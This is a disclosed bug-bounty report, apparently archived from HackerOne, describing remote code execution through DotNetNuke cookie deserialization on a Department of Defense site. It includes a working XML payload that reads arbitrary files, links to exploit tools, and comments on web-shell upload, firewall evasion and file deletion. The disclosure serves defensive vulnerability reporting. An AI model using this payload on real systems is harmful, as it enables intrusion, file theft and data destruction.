---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/os-command-injection
  - env/web
  - vuln/code-injection
  - vuln/rce-unsafe-deserialization
  - impact/rce
substate: "resolved"
weakness: "OS Command Injection"
enriched: true
body: true
date: 2020-05-27
submitted: 2020-05-17T20:13:54.706Z
bounty_usd: null
votes: 56
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "cristiancornea"
source: "https://hackerone.com/reports/876708"
title: "Remote Code Execution through DNN Cookie Deserialization "
---
# Remote Code Execution through DNN Cookie Deserialization 

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 56 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2020-05-27

- Report: [https://hackerone.com/reports/876708](https://hackerone.com/reports/876708)
- CWE: OS Command Injection
- Submitted: 2020-05-17T20:13:54.706Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Summary:**
The application at ```https://████████``` presents a deserialization vulnerability that permits RCE and file read/write

## Step-by-step Reproduction Instructions

1. Navigate to a random page that must return a 404 Error status like ```https://████/test```
2. Add this cookie in the request header: ```DNNPersonalization```
3. Insert the payload into the ```DNNPersonalization``` cookie. You can generate a payload with the following tool https://github.com/pwntester/ysoserial.net, using the DotNetNuke plugin, or use the official exploit from here: https://www.exploit-db.com/exploits/48336, or use the following payload to read a file from the system:

```
<profile>
<item key="name1:key1" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=█████████]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=███████"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<ExpandedElement/>
<ProjectedProperty0>
<MethodName>WriteFile</MethodName>
<MethodParameters>
<anyType xsi:type="xsd:string">test</anyType>
</MethodParameters>
<ObjectInstance xsi:type="FileSystemUtils"></ObjectInstance>
</ProjectedProperty0>
</ExpandedWrapperOfFileSystemUtilsObjectDataProvider>
</item>
</profile>
```

Where ```test``` is the wanted file

Expected result:
████


## Product, Version, and Configuration (If applicable)
Platform: https://████████/shell.aspx
Vulnerable Product: DotNetNuke
Vulnerable Version: < 9.3.0-RC


## Suggested Mitigation/Remediation Actions
Update the DotNetNuke (DNN) product to the latest version or to a more recent version that is not vulnerable

## Impact

An attacker can execute remote commands on the system and gain unauthorized access to it.

## Timeline

- **Report Filed**
- **2020-05-17** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **Report Needs More Info**
- **Report New**
- **Report Severity Updated**
- **Report Triaged**
- **2020-05-18** @agent-r5: So far we do not see the RCE just ability to get to file system. If you provide proof of rce (maybe call cmd.exe to run whoami) we will raise severity appropriately.
- **2020-05-18** @cristiancornea: There is the possibility to write files on the system too, which can result into an ASPX Web Shell upload, but for that you must have knowledge about a complete path with write permissions, like the installation folder of the web application. You can brute force the paths using the file read payloads as it will be reflected through the application if there does not exist or if you do not have enough privileges for it.
- **2020-05-21** @cristiancornea: The application throws a 403 error status when trying to parse a RCE payload, that's mostly probable the WAF is triggered when a client is trying to send such payloads using ```ObjectStateFormatter```
- **Report Needs More Info**
- **Report New**
- **2020-05-24** @cristiancornea: As a recap of the issue, the application was vulnerable to payloads based on only ``DotNetNuke.*`` classes. 

The ``Deserialize`` method belonging to  ``ObjectStateFormatter`` requires a Base64 encoded payload to be parsed through its string argument, which was immediately caught by a Web Application Firewall or some detection mechanism, and it didn't allow the payload to be sent through the ``DNNPersonalization`` cookie.

The vulnerability was demonstrated by pulling the ``C:\Windows\system.ini`` file through the ``WriteFile`` method of the ``DotNetNuke.Common.Utilities.FileSystemUtils`` class. (XML Payload)

Besides reading arbitrary files, an attacker could use other methods of the ``DotNetNuke.Common.Utilities.FileSystemUtils`` class to perform other actions, for example:

- Upload file (requires permissions and full local path), through the ``CreateFileFromString`` method
- Delete file (requires permissions and full local path), through the ``DeleteFile`` method
- Delete folders (requires permissions and full local path), through the ``DeleteFolderRecursive`` method

A list full of methods can be found here: https://dnndocs.com/api/DotNetNuke.html , some of them may be or may not be working, as the documentation relates to the latest version, and we are testing against an old version of DNN.
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
